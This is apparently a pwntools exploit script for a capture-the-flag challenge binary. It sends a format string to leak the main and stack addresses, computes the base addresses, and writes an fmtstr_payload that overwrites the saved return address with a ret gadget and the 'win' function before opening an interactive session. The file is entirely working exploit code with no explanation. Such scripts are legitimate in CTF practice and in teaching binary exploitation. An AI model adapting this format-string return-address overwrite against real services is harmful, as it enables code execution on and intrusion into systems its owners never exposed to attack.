from pwn import *
import time

# Set up the binary
elf = context.binary = ELF("./chall")
# p = process()
p = remote("127.0.0.1",1470)
# p = remote("playground.tcp1p.team",4156)
# context.terminal = ['wt.exe','wsl.exe'] 
# context.log_level = 'debug'
# Send format string payload
p.sendline(b"OMO%77$pOMO%82$p")
# print(len(b"OMO%77$pOMO%46$p"))
p.recvuntil(b"OMO")  # Synchronize output

# Receive the leak and split it
leaks = p.recvline().strip().split(b"OMO")
leak_main = int(leaks[0], 16)  # 77th format string leak (main)
leak_stack = int(leaks[1], 16)  # 3th format string leak (stack)
elf.address = leak_main - elf.sym['main']
# Print the leaks for debugging
base_stack = leak_stack - 0x20c98
rip_stack = base_stack + 0x20b78
offset_fmstr = 6
log.info(f"Leaked main: {hex(leak_main)}")
log.info(f"Leaked stack: {hex(leak_stack)}")
log.info(f"BASE : {hex(elf.address)}")
log.info(f"BASE STACK : {hex(base_stack)}")
log.info(f"rip: {hex(rip_stack)}")
log.info(f"win: {hex(elf.sym['win'])}")
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
win = elf.sym['win']
payload = fmtstr_payload(6,{rip_stack: ret,rip_stack + 8: win})
log.info(f"len {len(payload)}")
log.info(f"payload : {payload}")
time.sleep(50)
p.sendline(payload)

# gdb.attach(p, '''
#         break perfect
#         ''')  # Use tmux
write("payload",payload)
print(p.recv(9999))
print(p.recv(9999))
p.interactive()
